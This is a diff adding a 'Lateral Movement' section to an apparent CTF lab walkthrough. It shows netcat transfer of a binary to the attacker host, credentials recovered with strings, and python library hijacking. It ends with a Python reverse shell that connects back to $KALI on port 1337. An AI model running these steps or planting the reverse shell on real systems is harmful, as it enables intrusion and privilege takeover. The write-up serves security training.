@@ -110,27 +110,91 @@ Password: ph0t0s1234
 
 <figure><img src="../../.gitbook/assets/image (355).png" alt=""><figcaption></figcaption></figure>
 
+**Kali**
+
+```
+```
+
+<figure><img src="../../.gitbook/assets/image (358).png" alt=""><figcaption></figcaption></figure>
+
+## Lateral Movement
+
+### Netcat
+
+**Kali(receiving)**
+
+```
+nc -l -p 1234 > valleyAuthenticator
+```
+
+**Victim(sending)**
+
+```
+nc -w 3 $KALI 1234 < valleyAuthenticator
+```
 
 
 
+**Kali**
+
+```
+strings valleyAuthenticator > out.txt
+```
+
+<figure><img src="../../.gitbook/assets/image (357).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (356).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+Username: valley
+Password: liberty123
+```
+
+<figure><img src="../../.gitbook/assets/image (359).png" alt=""><figcaption></figcaption></figure>
 
 
 
+**Victim**
 
+```
+cat /photos/script/photosEncrypt.py
+```
 
+<figure><img src="../../.gitbook/assets/image (360).png" alt=""><figcaption></figcaption></figure>
 
+**Victim**
 
+```
+locate base64
+ls -lah /usr/lib/python3.8/base64.py
+groups
+```
 
+<figure><img src="../../.gitbook/assets/image (361).png" alt=""><figcaption></figcaption></figure>
 
+#### Python Reverse Shell
 
+```
+from os import dup2
+from subprocess import run
+import socket
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("$KALI",1337)) 
+dup2(s.fileno(),0) 
+dup2(s.fileno(),1) 
+dup2(s.fileno(),2) 
+run(["/bin/bash","-i"])
+```
 
+**Kali**
 
+```
+nc -lvnp 1337
+```
 
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure>
 
 
 
